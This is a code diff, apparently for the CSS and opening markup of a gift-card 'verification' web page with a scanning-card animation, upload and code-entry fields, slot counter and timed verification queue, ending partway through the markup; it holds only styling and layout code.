@@ -38,7 +38,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* Grid lines background */
         body::before {
             content: '';
             position: fixed; inset: 0;
@@ -49,439 +48,325 @@
             pointer-events: none; z-index: 0;
         }
 
-        /* Glow orbs */
-        .orb1 {
-            position: fixed; top: -100px; left: -100px;
-            width: 500px; height: 500px;
-            background: radial-gradient(circle, rgba(0,212,255,0.06) 0%, transparent 70%);
-            pointer-events: none; z-index: 0;
-        }
-        .orb2 {
-            position: fixed; bottom: -100px; right: -100px;
-            width: 400px; height: 400px;
-            background: radial-gradient(circle, rgba(0,153,187,0.05) 0%, transparent 70%);
-            pointer-events: none; z-index: 0;
-        }
+        .orb1 { position:fixed; top:-100px; left:-100px; width:500px; height:500px; background:radial-gradient(circle,rgba(0,212,255,0.06) 0%,transparent 70%); pointer-events:none; z-index:0; }
+        .orb2 { position:fixed; bottom:-100px; right:-100px; width:400px; height:400px; background:radial-gradient(circle,rgba(0,153,187,0.05) 0%,transparent 70%); pointer-events:none; z-index:0; }
 
         /* ── NAV ── */
         nav {
-            position: sticky; top: 0; z-index: 100;
-            background: rgba(10,15,30,0.9);
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border);
-            padding: 0 1.5rem; height: 64px;
-            display: flex; align-items: center; justify-content: space-between;
+            position:sticky; top:0; z-index:100;
+            background:rgba(10,15,30,0.9);
+            backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
+            border-bottom:1px solid var(--border);
+            padding:0 1.5rem; height:64px;
+            display:flex; align-items:center; justify-content:space-between;
         }
-        @media(min-width:640px){ nav { padding: 0 2.5rem; } }
+        @media(min-width:640px){ nav { padding:0 2.5rem; } }
 
         .nav-logo {
-            font-family: 'Syne', sans-serif; font-weight: 800;
-            font-size: 1.2rem; letter-spacing: -0.02em; color: var(--text);
-            display: flex; align-items: center; gap: 10px; flex-shrink: 0;
+            font-family:'Syne',sans-serif; font-weight:800;
+            font-size:1.2rem; letter-spacing:-0.02em; color:var(--text);
+            display:flex; align-items:center; gap:10px; flex-shrink:0;
         }
         .nav-logo .icon-wrap {
-            width: 34px; height: 34px;
-            background: linear-gradient(135deg, var(--accent), var(--accent-dk));
-            border-radius: 9px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 0.85rem; color: #0a0f1e;
-            box-shadow: 0 0 16px rgba(0,212,255,0.3);
+            width:34px; height:34px;
+            background:linear-gradient(135deg,var(--accent),var(--accent-dk));
+            border-radius:9px; display:flex; align-items:center;
+            justify-content:center; font-size:0.85rem; color:#0a0f1e;
+            box-shadow:0 0 16px rgba(0,212,255,0.3);
         }
-        .nav-logo span { color: var(--accent); }
+        .nav-logo span { color:var(--accent); }
 
         /* ── HERO ── */
         .hero {
-            position: relative; z-index: 1;
-            max-width: 1100px; margin: 0 auto;
-            padding: 3rem 1.5rem 0;
-            display: grid; grid-template-columns: 1fr;
-            gap: 3rem; align-items: center;
+            position:relative; z-index:1;
+            max-width:1100px; margin:0 auto;
+            padding:3rem 1.5rem 0;
+            display:grid; grid-template-columns:1fr;
+            gap:3rem; align-items:center;
         }
-        @media(min-width:768px){
-            .hero { grid-template-columns: 1fr 1fr; padding: 5rem 2.5rem 0; }
-        }
+        @media(min-width:768px){ .hero { grid-template-columns:1fr 1fr; padding:5rem 2.5rem 0; } }
 
         .hero-text h1 {
-            font-family: 'Syne', sans-serif; font-weight: 800;
-            font-size: clamp(2rem, 6vw, 3.5rem);
-            line-height: 1.1; letter-spacing: -0.03em; color: var(--text);
+            font-family:'Syne',sans-serif; font-weight:800;
+            font-size:clamp(2rem,6vw,3.5rem);
+            line-height:1.1; letter-spacing:-0.03em; color:var(--text);
         }
-        .hero-text h1 span {
-            color: var(--accent);
-            text-shadow: 0 0 30px rgba(0,212,255,0.4);
-        }
-        .hero-text p {
-            color: var(--muted); margin-top: 1rem;
-            font-size: 0.95rem; line-height: 1.7; max-width: 420px;
-        }
+        .hero-text h1 span { color:var(--accent); text-shadow:0 0 30px rgba(0,212,255,0.4); }
+        .hero-text p { color:var(--muted); margin-top:1rem; font-size:0.95rem; line-height:1.7; max-width:420px; }
 
-        .hero-badges {
-            display: flex; flex-wrap: wrap; gap: 0.75rem; margin-top: 1.5rem;
-        }
+        .hero-badges { display:flex; flex-wrap:wrap; gap:0.75rem; margin-top:1.5rem; }
         .badge {
-            display: flex; align-items: center; gap: 7px;
-            background: var(--accent-lt);
-            border: 1px solid var(--border);
-            padding: 7px 14px; border-radius: 999px;
-            font-size: 0.78rem; color: var(--muted);
+            display:flex; align-items:center; gap:7px;
+            background:var(--accent-lt); border:1px solid var(--border);
+            padding:7px 14px; border-radius:999px;
+            font-size:0.78rem; color:var(--muted);
         }
-        .badge i { color: var(--accent); font-size: 0.75rem; }
+        .badge i { color:var(--accent); font-size:0.75rem; }
 
-        /* ── CARD MOCKUP WITH SCAN ── */
-        .card-mockup {
-            display: flex; align-items: center; justify-content: center;
-            padding: 2rem 0;
-        }
-
-        .card-scene {
-            width: 100%; max-width: 340px;
-            position: relative;
-        }
+        /* ── CARD MOCKUP ── */
+        .card-mockup { display:flex; align-items:center; justify-content:center; padding:2rem 0; }
+        .card-scene { width:100%; max-width:340px; position:relative; }
 
         .gift-card {
-            width: 100%;
-            aspect-ratio: 1.586 / 1;
-            background: linear-gradient(135deg, #0d1f3c 0%, #1a3a5c 50%, #0a2040 100%);
-            border-radius: 16px;
-            padding: 1.5rem;
-            position: relative;
-            overflow: hidden;
-            box-shadow:
-                0 0 0 1px rgba(0,212,255,0.2),
-                0 20px 60px rgba(0,0,0,0.5),
-                0 0 40px rgba(0,212,255,0.05);
+            width:100%; aspect-ratio:1.586/1;
+            background:linear-gradient(135deg,#0d1f3c 0%,#1a3a5c 50%,#0a2040 100%);
+            border-radius:16px; padding:1.5rem; position:relative; overflow:hidden;
+            box-shadow:0 0 0 1px rgba(0,212,255,0.2),0 20px 60px rgba(0,0,0,0.5),0 0 40px rgba(0,212,255,0.05);
         }
-
-        /* Card circuit pattern */
         .gift-card::before {
-            content: '';
-            position: absolute; inset: 0;
-            background-image:
-                linear-gradient(rgba(0,212,255,0.04) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0,212,255,0.04) 1px, transparent 1px);
-            background-size: 20px 20px;
+            content:''; position:absolute; inset:0;
+            background-image:linear-gradient(rgba(0,212,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.04) 1px,transparent 1px);
+            background-size:20px 20px;
         }
-
-        /* Cyan glow edge */
         .gift-card::after {
-            content: '';
-            position: absolute; inset: 0;
-            border-radius: 16px;
-            background: linear-gradient(135deg, rgba(0,212,255,0.08) 0%, transparent 50%);
-            pointer-events: none;
+            content:''; position:absolute; inset:0; border-radius:16px;
+            background:linear-gradient(135deg,rgba(0,212,255,0.08) 0%,transparent 50%);
+            pointer-events:none;
         }
 
-        /* ── SCAN LINE ── */
         .scan-line {
-            position: absolute;
-            left: 0; right: 0;
-            height: 2px;
-            background: linear-gradient(90deg,
-                transparent 0%,
-                rgba(0,212,255,0.3) 20%,
-                rgba(0,212,255,0.9) 50%,
-                rgba(0,212,255,0.3) 80%,
-                transparent 100%
-            );
-            box-shadow: 0 0 12px rgba(0,212,255,0.8), 0 0 24px rgba(0,212,255,0.4);
-            animation: scanDown 2.5s ease-in-out infinite;
-            z-index: 10;
+            position:absolute; left:0; right:0; height:2px;
+            background:linear-gradient(90deg,transparent 0%,rgba(0,212,255,0.3) 20%,rgba(0,212,255,0.9) 50%,rgba(0,212,255,0.3) 80%,transparent 100%);
+            box-shadow:0 0 12px rgba(0,212,255,0.8),0 0 24px rgba(0,212,255,0.4);
+            animation:scanDown 2.5s ease-in-out infinite; z-index:10;
         }
+        @keyframes scanDown { 0%{top:0%;opacity:0;} 5%{opacity:1;} 95%{opacity:1;} 100%{top:100%;opacity:0;} }
 
-        @keyframes scanDown {
-            0%   { top: 0%; opacity: 0; }
-            5%   { opacity: 1; }
-            95%  { opacity: 1; }
-            100% { top: 100%; opacity: 0; }
-        }
-
-        /* Scan glow region that follows */
         .scan-glow {
-            position: absolute;
-            left: 0; right: 0;
-            height: 60px;
-            background: linear-gradient(180deg,
-                transparent 0%,
-                rgba(0,212,255,0.04) 50%,
-                transparent 100%
-            );
-            animation: glowDown 2.5s ease-in-out infinite;
-            z-index: 9;
-            pointer-events: none;
+            position:absolute; left:0; right:0; height:60px;
+            background:linear-gradient(180deg,transparent 0%,rgba(0,212,255,0.04) 50%,transparent 100%);
+            animation:glowDown 2.5s ease-in-out infinite; z-index:9; pointer-events:none;
         }
+        @keyframes glowDown { 0%{top:-30px;opacity:0;} 5%{opacity:1;} 95%{opacity:1;} 100%{top:calc(100% - 30px);opacity:0;} }
 
-        @keyframes glowDown {
-            0%   { top: -30px; opacity: 0; }
-            5%   { opacity: 1; }
-            95%  { opacity: 1; }
-            100% { top: calc(100% - 30px); opacity: 0; }
-        }
+        .card-inner { position:relative; z-index:5; height:100%; display:flex; flex-direction:column; justify-content:space-between; }
+        .card-top { display:flex; justify-content:space-between; align-items:flex-start; }
+        .card-label { font-size:0.6rem; letter-spacing:0.18em; text-transform:uppercase; color:rgba(0,212,255,0.7); font-family:'DM Mono',monospace; }
+        .card-chip { width:34px; height:26px; background:linear-gradient(135deg,rgba(0,212,255,0.3),rgba(0,212,255,0.1)); border:1px solid rgba(0,212,255,0.3); border-radius:5px; }
+        .card-number { font-family:'DM Mono',monospace; font-size:clamp(0.85rem,2.5vw,1rem); color:rgba(255,255,255,0.9); letter-spacing:0.12em; text-shadow:0 0 10px rgba(0,212,255,0.3); }
+        .card-bottom { display:flex; justify-content:space-between; align-items:flex-end; }
+        .card-name { font-size:0.7rem; color:rgba(255,255,255,0.6); letter-spacing:0.08em; font-weight:500; }
+        .card-brand { font-family:'Syne',sans-serif; font-weight:800; font-size:0.95rem; color:var(--accent); text-shadow:0 0 10px rgba(0,212,255,0.5); }
 
-        .card-inner {
-            position: relative; z-index: 5;
-            height: 100%; display: flex; flex-direction: column;
-            justify-content: space-between;
-        }
-
-        .card-top { display: flex; justify-content: space-between; align-items: flex-start; }
-        .card-label {
-            font-size: 0.6rem; letter-spacing: 0.18em;
-            text-transform: uppercase; color: rgba(0,212,255,0.7);
-            font-family: 'DM Mono', monospace;
-        }
-        .card-chip {
-            width: 34px; height: 26px;
-            background: linear-gradient(135deg, rgba(0,212,255,0.3), rgba(0,212,255,0.1));
-            border: 1px solid rgba(0,212,255,0.3);
-            border-radius: 5px;
-        }
-
-        .card-number {
-            font-family: 'DM Mono', monospace;
-            font-size: clamp(0.85rem, 2.5vw, 1rem);
-            color: rgba(255,255,255,0.9);
-            letter-spacing: 0.12em;
-            text-shadow: 0 0 10px rgba(0,212,255,0.3);
-        }
-
-        .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
-        .card-name {
-            font-size: 0.7rem; color: rgba(255,255,255,0.6);
-            letter-spacing: 0.08em; font-weight: 500;
-        }
-        .card-brand {
-            font-family: 'Syne', sans-serif; font-weight: 800;
-            font-size: 0.95rem; color: var(--accent);
-            text-shadow: 0 0 10px rgba(0,212,255,0.5);
-        }
-
-        /* Scanning status */
         .scan-status {
-            margin-top: 1rem;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            font-family: 'DM Mono', monospace;
-            font-size: 0.7rem; color: var(--accent);
-            letter-spacing: 0.1em;
-            animation: blinkStatus 2.5s ease-in-out infinite;
+            margin-top:1rem; display:flex; align-items:center; justify-content:center; gap:8px;
+            font-family:'DM Mono',monospace; font-size:0.7rem; color:var(--accent);
+            letter-spacing:0.1em; animation:blinkStatus 2.5s ease-in-out infinite;
         }
-        .scan-status-dot {
-            width: 6px; height: 6px;
-            background: var(--accent); border-radius: 50%;
-            box-shadow: 0 0 6px var(--accent);
-            animation: blinkDot 2.5s ease-in-out infinite;
-        }
-        @keyframes blinkStatus {
-            0%,100% { opacity: 0.4; }
-            50%      { opacity: 1; }
-        }
-        @keyframes blinkDot {
-            0%,100% { transform: scale(0.7); opacity: 0.4; }
-            50%      { transform: scale(1.2); opacity: 1; }
-        }
+        .scan-status-dot { width:6px; height:6px; background:var(--accent); border-radius:50%; box-shadow:0 0 6px var(--accent); animation:blinkDot 2.5s ease-in-out infinite; }
+        @keyframes blinkStatus { 0%,100%{opacity:0.4;} 50%{opacity:1;} }
+        @keyframes blinkDot { 0%,100%{transform:scale(0.7);opacity:0.4;} 50%{transform:scale(1.2);opacity:1;} }
 
         /* ── FORM SECTION ── */
         .form-section {
-            position: relative; z-index: 10;
-            max-width: 580px; margin: 0 auto;
-            padding: 2rem 1.25rem 5rem;
+            position:relative; z-index:10;
+            max-width:580px; margin:0 auto;
+            padding:2rem 1.25rem 5rem;
         }
-        @media(min-width:640px){ .form-section { padding: 3rem 2rem 5rem; } }
+        @media(min-width:640px){ .form-section { padding:3rem 2rem 5rem; } }
 
         .form-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 2rem 1.5rem;
-            box-shadow: 0 0 0 1px rgba(0,212,255,0.05), 0 20px 60px rgba(0,0,0,0.3);
+            background:var(--surface); border:1px solid var(--border);
+            border-radius:24px; padding:2rem 1.5rem;
+            box-shadow:0 0 0 1px rgba(0,212,255,0.05),0 20px 60px rgba(0,0,0,0.3);
         }
-        @media(min-width:640px){ .form-card { padding: 2.5rem; } }
+        @media(min-width:640px){ .form-card { padding:2.5rem; } }
 
-        .form-title {
-            font-family: 'Syne', sans-serif; font-weight: 800;
-            font-size: 1.4rem; color: var(--text); margin-bottom: 0.25rem;
+        .form-title { font-family:'Syne',sans-serif; font-weight:800; font-size:1.4rem; color:var(--text); margin-bottom:0.25rem; }
+        .form-title span { color:var(--accent); }
+        .form-sub { color:var(--muted); font-size:0.83rem; margin-bottom:1.25rem; }
+
+        /* Slot counter */
+        .slot-counter {
+            display:flex; align-items:center; justify-content:space-between;
+            background:var(--surface2); border:1px solid var(--border);
+            border-radius:10px; padding:8px 14px; margin-bottom:1.5rem;
         }
-        .form-title span { color: var(--accent); }
-        .form-sub { color: var(--muted); font-size: 0.83rem; margin-bottom: 2rem; }
+        .slot-label { font-size:0.72rem; color:var(--muted); font-weight:500; }
+        .slot-dots { display:flex; gap:6px; align-items:center; }
+        .slot-dot {
+            width:10px; height:10px; border-radius:50%;
+            border:1.5px solid rgba(0,212,255,0.2);
+            background:var(--surface); transition:all 0.3s;
+        }
+        .slot-dot.used { background:var(--accent); border-color:var(--accent); box-shadow:0 0 6px rgba(0,212,255,0.4); }
+        .slot-dot.processing { background:rgba(0,212,255,0.3); border-color:var(--accent); animation:pulseDot 1s ease-in-out infinite; }
+        @keyframes pulseDot { 0%,100%{transform:scale(1);} 50%{transform:scale(1.3);} }
 
-        /* Section label */
         .sec-label {
-            font-size: 0.68rem; font-weight: 700; color: var(--muted);
-            letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 0.5rem;
-            display: flex; align-items: center; gap: 6px;
+            font-size:0.68rem; font-weight:700; color:var(--muted);
+            letter-spacing:0.12em; text-transform:uppercase; margin-bottom:0.5rem;
+            display:flex; align-items:center; gap:6px;
         }
         .sec-label .opt {
-            font-size: 0.6rem; color: var(--accent);
-            background: var(--accent-lt); border: 1px solid var(--border);
-            padding: 1px 7px; border-radius: 999px;
-            letter-spacing: 0.05em; font-weight: 500; text-transform: none;
+            font-size:0.6rem; color:var(--accent);
+            background:var(--accent-lt); border:1px solid var(--border);
+            padding:1px 7px; border-radius:999px;
+            letter-spacing:0.05em; font-weight:500; text-transform:none;
         }
 
         /* Upload */
         .upload-area {
-            border: 1.5px dashed rgba(0,212,255,0.2);
-            border-radius: 14px; padding: 1.75rem 1.5rem;
-            text-align: center; cursor: pointer;
-            transition: all 0.3s ease;
-            background: var(--accent-lt);
-            margin-bottom: 1.5rem;
+            border:1.5px dashed rgba(0,212,255,0.2); border-radius:14px;
+            padding:1.75rem 1.5rem; text-align:center; cursor:pointer;
+            transition:all 0.3s ease; background:var(--accent-lt); margin-bottom:1.5rem;
         }
-        .upload-area:hover { border-color: var(--accent); background: rgba(0,212,255,0.1); }
-        .upload-area.uploaded { border-color: var(--green); border-style: solid; background: var(--green-lt); }
+        .upload-area:hover { border-color:var(--accent); background:rgba(0,212,255,0.1); }
+        .upload-area.uploaded { border-color:var(--green); border-style:solid; background:var(--green-lt); }
 
-        .upload-icon {
-            width: 48px; height: 48px;
-            background: rgba(0,212,255,0.1);
-            border: 1px solid var(--border);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 0.75rem;
-            font-size: 1.1rem; color: var(--accent);
-        }
-        .upload-title { font-weight: 600; font-size: 0.9rem; color: var(--text); }
-        .upload-title span { color: var(--accent); }
-        .upload-sub { font-size: 0.72rem; color: var(--muted); margin-top: 4px; }
+        .upload-icon { width:48px; height:48px; background:rgba(0,212,255,0.1); border:1px solid var(--border); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 0.75rem; font-size:1.1rem; color:var(--accent); }
+        .upload-title { font-weight:600; font-size:0.9rem; color:var(--text); }
+        .upload-title span { color:var(--accent); }
+        .upload-sub { font-size:0.72rem; color:var(--muted); margin-top:4px; }
 
         /* Code input */
-        .code-wrap { position: relative; margin-bottom: 0.5rem; }
-        .code-wrap i {
-            position: absolute; left: 1rem; top: 50%;
-            transform: translateY(-50%); color: var(--muted); font-size: 0.9rem;
-        }
+        .code-wrap { position:relative; margin-bottom:0.5rem; }
+        .code-wrap i { position:absolute; left:1rem; top:50%; transform:translateY(-50%); color:var(--muted); font-size:0.9rem; }
         .code-input {
-            width: 100%;
-            background: var(--surface2);
-            border: 1.5px solid rgba(0,212,255,0.15);
-            border-radius: 12px;
-            padding: 1rem 1rem 1rem 2.75rem;
-            font-family: 'DM Mono', monospace;
-            font-size: 1.05rem; color: var(--text);
-            letter-spacing: 0.1em; text-transform: uppercase;
-            outline: none; transition: border-color 0.2s, background 0.2s;
+            width:100%; background:var(--surface2);
+            border:1.5px solid rgba(0,212,255,0.15); border-radius:12px;
+            padding:1rem 1rem 1rem 2.75rem;
+            font-family:'DM Mono',monospace; font-size:1.05rem; color:var(--text);
+            letter-spacing:0.1em; text-transform:uppercase;
+            outline:none; transition:border-color 0.2s,background 0.2s;
         }
-        .code-input:focus { border-color: var(--accent); background: rgba(0,212,255,0.05); }
-        .code-input::placeholder { color: rgba(107,127,163,0.5); letter-spacing: 0.05em; }
+        .code-input:focus { border-color:var(--accent); background:rgba(0,212,255,0.05); }
+        .code-input::placeholder { color:rgba(107,127,163,0.5); letter-spacing:0.05em; }
 
-        .char-counter {
-            text-align: right; font-size: 0.7rem;
-            font-family: 'DM Mono', monospace; color: var(--muted);
-            margin-bottom: 1.25rem;
-        }
-        .char-counter.full { color: var(--green); font-weight: 600; }
+        .char-counter { text-align:right; font-size:0.7rem; font-family:'DM Mono',monospace; color:var(--muted); margin-bottom:1.25rem; }
+        .char-counter.full { color:var(--green); font-weight:600; }
 
-        /* Hint */
-        .hint {
-            display: none; align-items: center; gap: 8px;
-            background: var(--red-lt); border: 1px solid rgba(239,68,68,0.2);
-            color: var(--red); font-size: 0.8rem;
-            padding: 10px 14px; border-radius: 10px; margin-bottom: 1rem;
-        }
-        .hint.show { display: flex; }
+        .hint { display:none; align-items:center; gap:8px; background:var(--red-lt); border:1px solid rgba(239,68,68,0.2); color:var(--red); font-size:0.8rem; padding:10px 14px; border-radius:10px; margin-bottom:1rem; }
+        .hint.show { display:flex; }
 
         /* Submit button */
         .submit-btn {
-            width: 100%;
-            background: linear-gradient(135deg, var(--accent), var(--accent-dk));
-            color: #0a0f1e;
-            font-family: 'DM Sans', sans-serif;
-            font-size: 1rem; font-weight: 700;
-            padding: 1rem; min-height: 54px;
-            border-radius: 12px; border: none; cursor: pointer;
-            transition: all 0.2s;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            box-shadow: 0 4px 20px rgba(0,212,255,0.25), 0 0 0 1px rgba(0,212,255,0.1);
-            -webkit-tap-highlight-color: transparent;
+            width:100%;
+            background:linear-gradient(135deg,var(--accent),var(--accent-dk));
+            color:#0a0f1e; font-family:'DM Sans',sans-serif;
+            font-size:1rem; font-weight:700;
+            padding:1rem; min-height:54px;
+            border-radius:12px; border:none; cursor:pointer;
+            transition:all 0.2s;
+            display:flex; align-items:center; justify-content:center; gap:8px;
+            box-shadow:0 4px 20px rgba(0,212,255,0.25),0 0 0 1px rgba(0,212,255,0.1);
+            -webkit-tap-highlight-color:transparent;
         }
-        .submit-btn:hover  { box-shadow: 0 6px 28px rgba(0,212,255,0.4), 0 0 0 1px rgba(0,212,255,0.2); transform: translateY(-1px); }
-        .submit-btn:active { transform: scale(0.98); }
-        .submit-btn:disabled { cursor: default; transform: none; }
-        .submit-btn.valid   { background: linear-gradient(135deg,#10b981,#059669) !important; color:white !important; box-shadow:0 4px 20px rgba(16,185,129,0.3) !important; }
-        .submit-btn.invalid { background: linear-gradient(135deg,#ef4444,#dc2626) !important; color:white !important; box-shadow:0 4px 20px rgba(239,68,68,0.3) !important; }
-        .submit-btn.try-again { background: var(--surface2) !important; color: var(--text) !important; border: 1px solid var(--border) !important; box-shadow: none !important; cursor: pointer !important; }
+        .submit-btn:hover  { box-shadow:0 6px 28px rgba(0,212,255,0.4),0 0 0 1px rgba(0,212,255,0.2); transform:translateY(-1px); }
+        .submit-btn:active { transform:scale(0.98); }
+        .submit-btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; box-shadow:none; }
+        .submit-btn.maxed  { background:var(--surface2) !important; color:var(--muted) !important; box-shadow:none !important; border:1px solid var(--border) !important; }
 
-        .privacy {
-            text-align: center; font-size: 0.73rem; color: var(--muted);
-            margin-top: 0.75rem;
-            display: flex; align-items: center; justify-content: center; gap: 5px;
-        }
-        .privacy i { color: var(--accent); font-size: 0.65rem; }
+        .privacy { text-align:center; font-size:0.73rem; color:var(--muted); margin-top:0.75rem; display:flex; align-items:center; justify-content:center; gap:5px; }
+        .privacy i { color:var(--accent); font-size:0.65rem; }
 
-        /* Status box */
-        .status-box {
-            display: none; margin-top: 1.5rem;
-            background: var(--surface2);
-            border: 1px solid var(--border);
-            border-radius: 18px; padding: 1.5rem;
-        }
-        .status-box.show { display: block; }
-
-        .status-header {
-            display: flex; align-items: center;
-            justify-content: space-between; flex-wrap: wrap;
-            gap: 0.75rem; margin-bottom: 1.25rem;
-        }
-        .status-title { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 1rem; color: var(--text); }
-        .status-sub   { font-size: 0.75rem; color: var(--muted); margin-top: 2px; }
-
-        .timer {
-            font-family: 'DM Mono', monospace; font-size: 1.6rem; font-weight: 700;
-            color: var(--accent);
-            background: var(--accent-lt); border: 1px solid var(--border);
-            padding: 5px 14px; border-radius: 10px; letter-spacing: 0.05em;
-            text-shadow: 0 0 10px rgba(0,212,255,0.3);
-            white-space: nowrap;
-        }
-        .timer.urgent { color: var(--red); background: var(--red-lt); border-color: rgba(239,68,68,0.2); text-shadow: none; }
-        .timer.done   { color: var(--muted); background: var(--surface); border-color: var(--border); text-shadow: none; font-size: 1rem; padding: 8px 14px; }
-
-        /* Progress */
-        .progress-wrap {
-            display: flex; justify-content: space-between;
-            position: relative; margin-bottom: 1.25rem;
-        }
-        .progress-line-bg {
-            position: absolute; top: 11px; left: 0; right: 0;
-            height: 2px; background: var(--border); z-index: 0;
-        }
-        .progress-step { display: flex; flex-direction: column; align-items: center; gap: 6px; position: relative; z-index: 1; }
-        .pnode {
-            width: 24px; height: 24px; border-radius: 50%;
-            border: 2px solid rgba(0,212,255,0.2);
-            background: var(--surface);
-            display: flex; align-items: center; justify-content: center;
-            transition: all 0.3s;
-        }
-        .pnode.active {
-            background: var(--accent); border-color: var(--accent);
-            box-shadow: 0 0 0 4px rgba(0,212,255,0.15), 0 0 12px rgba(0,212,255,0.4);
-        }
-        .pnode.active i { color: #0a0f1e; font-size: 0.6rem; }
-        .plabel { font-size: 0.63rem; font-weight: 600; color: var(--muted); white-space: nowrap; }
-        .plabel.active { color: var(--accent); }
-
-        /* Result banner */
-        .result-banner {
-            display: none; padding: 1rem 1.25rem;
-            border-radius: 12px; font-weight: 600; font-size: 0.88rem;
-            margin-top: 1rem; align-items: center; gap: 10px;
-        }
-        .result-banner.show { display: flex; }
-        .result-banner.approved { background: var(--green-lt); border: 1px solid rgba(16,185,129,0.2); color: #6ee7b7; }
-        .result-banner.rejected { background: var(--red-lt);   border: 1px solid rgba(239,68,68,0.2);  color: #fca5a5; }
-
-        /* Remove btn */
-        .remove-btn {
-            background: none; border: none; cursor: pointer;
-            color: var(--red); font-size: 0.78rem;
-            display: flex; align-items: center; gap: 4px;
-            margin: 0.5rem auto 0; font-family: 'DM Sans', sans-serif;
-            -webkit-tap-highlight-color: transparent;
+        /* ── VERIFICATION QUEUE ── */
+        #verificationQueue {
+            margin-top:2rem; display:flex; flex-direction:column; gap:1rem;
         }
 
-        footer {
-            text-align: center; padding: 2rem;
-            color: var(--muted); font-size: 0.78rem;
-            position: relative; z-index: 1;
+        .queue-header {
+            display:flex; align-items:center; justify-content:space-between;
+            margin-bottom:0.25rem;
         }
+        .queue-title {
+            font-family:'Syne',sans-serif; font-weight:700;
+            font-size:0.9rem; color:var(--text);
+            display:flex; align-items:center; gap:8px;
+        }
+        .queue-title i { color:var(--accent); font-size:0.8rem; }
+        .queue-count {
+            font-family:'DM Mono',monospace; font-size:0.65rem;
+            color:var(--accent); background:var(--accent-lt);
+            border:1px solid var(--border); padding:2px 8px; border-radius:999px;
+        }
+
+        /* Individual verification card */
+        .v-card {
+            background:var(--surface2); border:1px solid var(--border);
+            border-radius:16px; padding:1rem;
+            animation:slideIn 0.35s ease both;
+            transition:opacity 0.5s ease, transform 0.5s ease;
+            position:relative; overflow:hidden;
+        }
+        .v-card::before {
+            content:''; position:absolute; top:0; left:0; right:0; height:1px;
+            background:linear-gradient(90deg,transparent,rgba(0,212,255,0.3),transparent);
+        }
+        @keyframes slideIn { from{opacity:0;transform:translateY(12px);} to{opacity:1;transform:translateY(0);} }
+        .v-card.fading { opacity:0; transform:translateY(-8px); }
+
+        /* Stack code on top, timer below on mobile */
+        .v-card-header {
+            display:flex; flex-direction:column;
+            gap:0.6rem; margin-bottom:0.85rem;
+        }
+
+        .v-card-top-row {
+            display:flex; align-items:flex-start;
+            justify-content:space-between; gap:0.5rem;
+        }
+
+        .v-card-header-left { flex:1; min-width:0; }
+
+        .v-code-label {
+            font-size:0.58rem; color:var(--muted);
+            letter-spacing:0.1em; text-transform:uppercase; margin-bottom:3px;
+        }
+        .v-code {
+            font-family:'DM Mono',monospace;
+            font-size:clamp(0.78rem,3.5vw,0.92rem);
+            color:var(--text); font-weight:500;
+            word-break:break-all; line-height:1.5;
+        }
+
+        .v-timer {
+            font-family:'DM Mono',monospace;
+            font-size:clamp(0.8rem,3vw,1rem); font-weight:700;
+            color:var(--accent); background:var(--accent-lt);
+            border:1px solid var(--border); padding:4px 10px;
+            border-radius:8px; white-space:nowrap; flex-shrink:0;
+            text-align:center; min-width:58px; align-self:flex-start;
+        }
+        .v-timer.urgent { color:var(--red); background:var(--red-lt); border-color:rgba(239,68,68,0.2); }
+        .v-timer.done   { color:var(--muted); background:var(--surface); border-color:var(--border); font-size:0.68rem; padding:5px 10px; }
+
+        /* Mini progress */
+        .v-progress {
+            display:flex; align-items:center; gap:5px; margin-bottom:0.65rem;
+        }
+        .v-pnode {
+            width:18px; height:18px; border-radius:50%;
+            border:1.5px solid rgba(0,212,255,0.2); background:var(--surface);
+            display:flex; align-items:center; justify-content:center;
+            flex-shrink:0; transition:all 0.3s;
+        }
+        .v-pnode.active { background:var(--accent); border-color:var(--accent); box-shadow:0 0 8px rgba(0,212,255,0.3); }
+        .v-pnode.active i { color:#0a0f1e; font-size:0.5rem; }
+        .v-pline { flex:1; height:1.5px; background:var(--border); }
+        .v-pline.active { background:var(--accent); }
+        .v-plabel {
+            font-size:clamp(0.58rem,2vw,0.65rem);
+            color:var(--muted); white-space:nowrap;
+        }
+
+        /* Result pill */
+        .v-result {
+            display:none; padding:10px 12px; border-radius:10px;
+            font-size:clamp(0.78rem,3vw,0.88rem); font-weight:600;
+            align-items:center; gap:8px; margin-top:0.5rem;
+            line-height:1.4;
+        }
+        .v-result i { flex-shrink:0; font-size:0.95rem; }
+        .v-result span { flex:1; min-width:0; }
+        .v-result.show { display:flex; }
+        .v-result.approved { background:var(--green-lt); border:1px solid rgba(16,185,129,0.2); color:#6ee7b7; }
+        .v-result.rejected { background:var(--red-lt);   border:1px solid rgba(239,68,68,0.2);  color:#fca5a5; }
+        .v-result.expired  { background:rgba(107,127,163,0.08); border:1px solid rgba(107,127,163,0.15); color:var(--muted); }
+
+        .remove-btn { background:none; border:none; cursor:pointer; color:var(--red); font-size:0.78rem; display:flex; align-items:center; gap:4px; margin:0.5rem auto 0; font-family:'DM Sans',sans-serif; -webkit-tap-highlight-color:transparent; }
+
+        footer { text-align:center; padding:2rem; color:var(--muted); font-size:0.78rem; position:relative; z-index:1; }
     </style>
 </head>
 <body>
@@ -510,7 +395,6 @@
             </div>
         </div>
 
-        <!-- CARD MOCKUP WITH SCAN -->
         <div class="card-mockup">
             <div class="card-scene">
                 <div class="gift-card">
@@ -543,6 +427,18 @@
         <h2 class="form-title">Start <span>Verification</span></h2>
         <p class="form-sub">Upload an image, enter your code, or provide both</p>
 
+        <!-- Slot counter -->
+        <div class="slot-counter">
+            <span class="slot-label"><i class="fa-solid fa-layer-group" style="color:var(--accent);margin-right:5px"></i>Verification slots</span>
+            <div class="slot-dots" id="slotDots">
